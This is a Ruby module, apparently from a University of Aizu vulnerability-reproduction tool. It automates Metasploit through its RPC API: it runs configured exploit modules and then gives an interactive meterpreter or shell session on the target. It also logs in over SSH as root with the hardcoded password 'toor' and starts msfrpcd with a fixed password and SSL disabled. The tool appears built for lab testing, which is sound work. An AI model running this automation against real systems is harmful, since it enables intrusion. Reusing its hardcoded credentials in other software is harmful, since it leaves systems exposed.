# Copyright [2019] [University of Aizu]
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

require_relative './tools/msf'
require_relative '../utility'

module Exploit

  def exploit(attack_machine_host, attack_config_path)
    @msf_api = MetasploitAPI.new(attack_machine_host)
    @msf_api.auth_login
    @msf_api.console_create

    # Lead yaml file
    msf_modules = YAML.load_file(attack_config_path)['metasploit_module']

    Utility.print_message('execute', 'exploit attack')

    msf_modules.each do |msf_module|
      msf_module_option = {}
      msf_module['options'].each { |option| msf_module_option[option['name']] = option['var'] }

      msf_module_option['LHOST'] = attack_machine_host
      msf_module_info = @msf_api.module_execute(msf_module['module_type'], msf_module['module_name'], msf_module_option)

      Utility.tty_spinner_begin(msf_module['module_name'])
      connection = false
      600.times do
        sleep(1)
        @msf_api.module_session_list.each { |key, value| connection = true if msf_module_info['uuid'] == value['exploit_uuid'] }
        break if connection
      end
      connection ? Utility.tty_spinner_end('success') : Utility.tty_spinner_end('error')
    end
  end

  def verify
    Utility.print_message('execute', 'execute verify')
    Utility.print_message('execute', 'Brake into target machine')

    # Use meterpreter by metasploit
    session_type, session_id = nil, nil
    @msf_api.module_session_list.each do |key, value|
      session_id = key if value['type'] == 'meterpreter' || value['type'] == 'shell'
      session_type = value['type'] unless session_id.nil?
    end
    return if session_id.nil?

    loop do
      print "#{session_type} > "
      command = gets.chomp.split(" ")[0]

      # When input next line
      next if command.nil?
      break if command == 'exit'

      case session_type
      when 'meterpreter'
        @msf_api.meterpreter_write(session_id, command)
      when 'shell'
        @msf_api.shell_write(session_id, command)
      end

      loop do
        sleep(1)
        res = {}
        case session_type
        when 'meterpreter'
          res = @msf_api.meterpreter_read(session_id)
        when 'shell'
          res = @msf_api.shell_read(session_id)
        end
        unless res['data'].empty?
          puts res['data']
          break
        end
      end
    end
  end

  def prepare(attack_machine_host, testdir, vulenv_config_path)
    vulenv_config = YAML.load_file(vulenv_config_path)

    if vulenv_config['construction'].key?('prepare')
      Utility.print_message('caution', 'following execute command')
      Utility.print_message('defalut', "  [1] cd #{testdir}")
      Utility.print_message('default', '  [2] vagrant ssh')
      vulenv_config['construction']['prepare']['msg'].each.with_index(3) { |msg, i| Utility.print_message('default', "  [#{i}] #{msg}") }

      Utility.print_message('caution', 'press ENTER when you prepare vulnerable environment.')
      gets
    end

    Utility.tty_spinner_begin('metasploit server')
    begin
      Net::SSH.start(attack_machine_host, 'root', :password => 'toor') do |ssh|
        ssh.exec!("msfrpcd -a #{attack_machine_host} -p 55553 -U msf -P metasploit -S false \>/dev/null 2>&1")
        ssh.exec!("msfrpcd -a #{attack_machine_host} -p 55553 -U msf -P metasploit -S false")
      end
    rescue
      Utility.tty_spinner_end('error')
      Utility.print_message('caution', 'Run your attack machine now.')

      Utility.print_message('execute', 'If it is running now, push ENTER.')
      gets

      Utility.tty_spinner_begin('metasploit server')
      retry
    end
    Utility.tty_spinner_end('success')
  end

  module_function :exploit
  module_function :prepare
  module_function :verify

end
